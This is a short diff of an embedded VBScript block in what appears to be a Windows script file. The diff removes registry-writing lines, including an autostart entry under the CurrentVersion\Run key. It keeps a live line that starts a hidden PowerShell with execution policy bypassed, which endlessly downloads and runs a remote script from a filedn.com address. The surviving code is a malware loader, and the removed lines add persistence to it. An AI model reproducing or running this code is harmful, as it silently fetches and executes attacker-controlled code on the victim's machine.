@@ -14,11 +14,7 @@
 	<script language="VBScript">
 		<![CDATA[
 		
-		  CreateObject("Wscript.Shell").regwrite "HKCU\Software\?", "?" , "REG_SZ"
-set O = CreateObject("Wscript.Shell")
-U=O.ExpandEnvironmentStrings("%windir%")
-O.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\?", U & "?" , "REG_SZ"
- Set ws=CreateObject("WScript.Shell")
+		 Set ws=CreateObject("WScript.Shell")
 ws.Run "cmd.exe /c start /min powershell -ExecutionPolicy Bypass -w hidden -c while($true){IEX((new-object net.webclient).downloadstring('https://filedn.com/l8WR7CI6Fagp3rvpUCNMA54/stub_pwshll.txt'))}", 0, vbhide
  
 Dim objWMIService : Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
